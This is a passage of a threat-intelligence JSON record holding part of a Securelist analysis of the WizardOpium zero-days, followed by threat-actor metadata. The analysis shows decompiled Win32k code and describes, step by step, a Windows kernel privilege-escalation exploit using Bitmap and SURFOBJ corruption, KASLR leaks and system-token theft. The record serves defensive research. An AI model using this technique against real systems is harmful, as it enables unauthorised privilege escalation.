*wnd, UINT msg, WPARAM wParam,\nLPARAM lParam)\n\n{\n\n...\n\npti = *(tagTHREADINFO **)&gptiCurrent;\n\n\n-----\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n\nif ( wnd >fnid != FNID_SWITCH )\n\n{\n\nif ( wnd->fnid || wnd->cbwndExtra + 296 < (unsigned int)gpsi>mpFnid_serverCBWndProc[6] )\n\nreturn 0i64;\n\nif ( msg != 1 )\n\nreturn xxxDefWindowProc(wnd, msg, wParam, lParam);\n\nif ( wnd[1].head.h )\n\nreturn 0i64;\n\nwnd->fnid = FNID_SWITCH;\n\n}\n\nswitch ( msg )\n\n{\n\ncase WM_CREATE:\n\nzzzSetCursor(wnd->pcls->spcur, pti, 0i64);\n\nbreak;\n\ncase WM_CLOSE:\n\nxxxSetWindowPos(wnd, 0, 0);\n\nxxxCancelCoolSwitch();\n\nbreak;\n\ncase WM_ERASEBKGND:\n\ncase WM_FULLSCREEN:\n\npti->ptl = (_TL *)&pti->ptl;\n\n++wnd->head.cLockObj;\n\nxxxPaintSwitchWindow(wnd, pti, 0i64);\n\nThreadUnlock1();\n\nreturn 0i64;\n\n}\n\n\n-----\n\nreturn xxxDefWindowProc(wnd, msg, wParam, lParam);\n\n}\n\nThe vulnerability in NtUserSetWindowLongPtr can then be used to overwrite the extra data\nat index zero, which happens to be a pointer to a structure containing information about the\nSwitch Window. In other words, the vulnerability makes it possible to set some arbitrary\nkernel pointer that will be treated as this structure.\n\nAt this stage it’s enough to call NtUserMessageCall again, but this time with a message\nequal to WM_ERASEBKGND. This results in the execution of the function\n_xxxPaintSwitchWindow that increments and decrements a couple of integers located by the_\npointer that we previously set.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\nsub   [rdi+60h], ebx\n\nadd   [rdi+68h], ebx\n\n...\n\nsub   [rdi+5Ch], ecx\n\nadd   [rdi+64h], ecx\n\n\nAn important condition for triggering the exploitable code path is that the ALT key needs to\nbe pressed.\n\nExploitation is performed by abusing Bitmaps. For successful exploitation a few Bitmaps\nneed to be allocated next to each other, and their kernel addresses need to be known. To\nachieve this, the exploit uses two common kernel ASLR bypass techniques. For Windows 7\nand Windows 10 build 10240 (Threshold 1) the Bitmap kernel addresses are leaked via the\n[GdiSharedHandleTable technique: in older versions of the OS there is a special table](https://www.coresecurity.com/blog/abusing-gdi-for-ring0-exploit-primitives)\navailable in the user level that holds the kernel addresses of all GDI objects present in the\nprocess. This particular technique was patched in Windows 10 build 14393 (Redstone 1), so\n[for this version the exploit uses another common technique that abuses Accelerator Tables](https://labs.f-secure.com/archive/a-tale-of-bitmaps/)\n(patched in Redstone 2). It involves creating a Create Accelerator Table object, leaking its\nkernel address from the gSharedInfo HandleTable available in the user level, and then\nfreeing the Accelerator Table object and allocating a Bitmap reusing the same memory\naddress.\n\nThe whole exploitation process works as follows: the exploit creates three bitmaps located\nnext to each other and their addresses are leaked. The exploit prepares Switch Window and\nuses a vulnerability in NtUserSetWindowLongPtr to set an address pointing near the end of\nthe first Bitmap as Switch Window extra data. Bitmaps are represented by a SURFOBJ\n\n\n-----\n\nstructure and the previously set address needs to be calculated in a way that will make the\nxxxPaintSwitchWindow function increment the sizlBitmap field of the SURFOBJ structure for\nthe Bitmap allocated next to the first one. The sizlBitmap field indicates the bounds of the\npixel data buffer and the incremented value will allow the use of the function SetBitmapBits()\nto perform an out-of-bounds write and overwrite the SURFOBJ of the third Bitmap object.\n\nThe pvScan0 field of the SURFOBJ structure is an address of the pixel data buffer, so the\nability to overwrite it with an arbitrary pointer results in arbitrary read/write primitives via the\nfunctions GetBitmapBits()/SetBitmapBits(). The exploit uses these primitives to parse the\nEPROCESS structure and steal the system token. To get the kernel address of the\n[EPROCESS structure, the exploit uses the function EnumDeviceDrivers. This function works](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers)\naccording to its MSDN description and it provides a list of kernel addresses for currently\nloaded drivers. The first address in the list is the address of ntkrnl and to get the offset to the\nEPROCESS structure the exploit parses an executable in search for the exported\nPsInitialSystemProcess variable.\n\nIt’s worth noting that this technique still works in the latest versions of Windows (tested with\nWindows 10 19H1 build 18362). Stealing the system token is the most common post\nexploitation technique that we see in the majority of elevation of privilege exploits. After\nacquiring system privileges the exploit downloads and executes the actual malware.\n\n## Conclusions\n\nIt was particularly interesting for us to examine the Chrome exploit because it was the first\nGoogle Chrome in-the-wild zero-day encountered for a while. It was also interesting that it\nwas used in combination with an elevation of privilege exploit that didn’t allow exploitation on\nthe latest versions of Windows mostly due to the Win32k lockdown security feature of\nGoogle Chrome. With regards to privilege elevation, it was also interesting that we found\nanother 1-day exploit for this vulnerability just one week after the patch, indicating how\nsimple it is to exploit this vulnerability.\n\n_We would like to thank the Google Chrome and Microsoft security teams for fixing these_\n_vulnerabilities so quickly. Google was generous enough to offer a bounty for CVE-2019-_\n_13720. The reward was donated to charity and Google matched the donation._\n\n[Google Chrome](https://securelist.com/tag/google-chrome/)\n[Malware Technologies](https://securelist.com/tag/malware-technologies/)\n[Microsoft Windows](https://securelist.com/tag/microsoft-windows/)\n[Vulnerabilities and exploits](https://securelist.com/tag/vulnerabilities-and-exploits/)\n[Watering hole attacks](https://securelist.com/tag/watering-hole-attacks/)\n[Zero-day vulnerabilities](https://securelist.com/tag/zero-day-vulnerabilities/)\n\nAuthors\n\n\n-----\n\nBoris Larin\n\nAlexey Kulaev\n\nThe zero-day exploits of Operation WizardOpium\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-28 - The zero-day exploits of Operation WizardOpium.pdf"
+    ],
+    "report_names": [
+        "2020-05-28 - The zero-day exploits of Operation WizardOpium.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "2008a79d-2f3a-475f-abef-3bc119a1bf38",
+            "created_at": "2022-10-25T16:07:24.028651Z",
+            "updated_at": "2025-03-27T02:02:10.084983Z",
+            "deleted_at": null,
+            "main_name": "Operation WizardOpium",
+            "aliases": [],
+            "source_name": "ETDA:Operation WizardOpium",
+            "tools": [],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "6b9fc913-06c6-4432-8c58-86a3ac614564",
+            "created_at": "2022-10-25T16:07:24.185236Z",
+            "updated_at": "2025-03-27T02:02:10.135195Z",
+            "deleted_at": null,
+            "main_name": "SideWinder",
+            "aliases": [
+                "APT-C-17",
+                "APT-Q-39",
+                "BabyElephant",
+                "GroupA21",
+                "HN2",
+                "Hardcore Nationalist",
+                "Rattlesnake",
+                "Razor Tiger",
+                "SideWinder",
+                "T-APT-04"
+            ],
+            "source_name": "ETDA:SideWinder",
+            "tools": [
+                "BroStealer",
+                "Capriccio RAT",
+                "callCam"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "5cd3fcb0-eb56-49ac-8125-47ebee93311d",
+            "created_at": "2023-01-06T13:46:39.065814Z",
+            "updated_at": "2025-03-27T02:00:02.988828Z",
+            "deleted_at": null,
+            "main_name": "Operation WizardOpium",
+            "aliases": [],
+            "source_name": "MISPGALAXY:Operation WizardOpium",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
+            "created_at": "2023-01-06T13:46:39.396409Z",
+            "updated_at": "2025-03-27T02:00:03.074969Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "CHROMIUM",
+                "ControlX",
+                "Red Dev 10",
+                "RedHotel",
+                "Red Scylla",
+                "TAG-22",
+                "BRONZE UNIVERSITY",
+                "AQUATIC PANDA",
+                "Charcoal Typhoon",
+                "BountyGlad"
+            ],
+            "source_name": "MISPGALAXY:Earth Lusca",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
+            "created_at": "2022-10-25T16:07:23.565337Z",
+            "updated_at": "2025-03-27T02:02:09.868522Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "Bronze University",
+                "Charcoal Typhoon",
+                "Chromium",
+                "Red Dev 10",
+                "Red Scylla"
+            ],
+            "source_name": "ETDA:Earth Lusca",
+            "tools": [
+                "Agentemis",
+                "AntSword",
+                "BIOPASS",
+                "BIOPASS RAT",
+                "BadPotato",
+                "Behinder",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "Doraemon",
+                "FRP",
+                "Fast Reverse Proxy",
+                "FunnySwitch",
+                "HUC Port Banner Scanner",
+                "KTLVdoor",
+                "Mimikatz",
+                "NBTscan",
+                "POISONPLUG.SHADOW",
+                "PipeMon",
+                "RbDoor",
+                "RibDoor",
+                "RouterGod",
+                "SAMRID",
+                "ShadowPad Winnti",
+                "SprySOCKS",
+                "WinRAR",
+                "Winnti",
+                "XShellGhost",
+                "cobeacon",
+                "fscan",
+                "lcx",
+                "nbtscan"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "173f1641-36e3-4bce-9834-c5372468b4f7",
+            "created_at": "2022-10-25T15:50:23.349637Z",
+            "updated_at": "2025-03-27T02:00:55.450857Z",
+            "deleted_at": null,
+            "main_name": "Sidewinder",
+            "aliases": [
+                "Sidewinder",
+                "T-APT-04"
+            ],
+            "source_name": "MITRE:Sidewinder",
+            "tools": [
+                "Koadic"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "d0c0a5ea-3066-42a5-846c-b13527f64a3e",
+            "created_at": "2023-01-06T13:46:39.080551Z",
+            "updated_at": "2025-03-27T02:00:02.992026Z",
+            "deleted_at": null,
+            "main_name": "RAZOR TIGER",
+            "aliases": [
+                "SideWinder",
+                "APT-C-17",
+                "T-APT-04"
+            ],
+            "source_name": "MISPGALAXY:RAZOR TIGER",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
+            "created_at": "2022-10-27T08:27:13.212301Z",
+            "updated_at": "2025-03-27T02:00:55.529662Z",
+            "deleted_at": null,
+            "main_name": "Earth Lusca",
+            "aliases": [
+                "Earth Lusca",
+                "TAG-22",
+                "Charcoal Typhoon",
+                "CHROMIUM",
+                "ControlX"
+            ],
+            "source_name": "MITRE:Earth Lusca",
+            "tools": [
+                "Mimikatz",
+                "PowerSploit",
+                "Tasklist",
+                "certutil",
+                "Cobalt Strike",
+                "Winnti for Linux",
+                "Nltest",
+                "NBTscan",
+                "ShadowPad"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535674,
+    "ts_updated_at": 1743041735,
+    "ts_creation_date": 1653714573,
+    "ts_modification_date": 1653714573,
+    "files": {
+        "pdf": "https://archive.orkl.eu/fa0fe2317aef1bce54802c40c7fb535b70f7d84a.pdf",
+        "text": "https://archive.orkl.eu/fa0fe2317aef1bce54802c40c7fb535b70f7d84a.txt",
+        "img": "https://archive.orkl.eu/fa0fe2317aef1bce54802c40c7fb535b70f7d84a.jpg"
+    }
+}
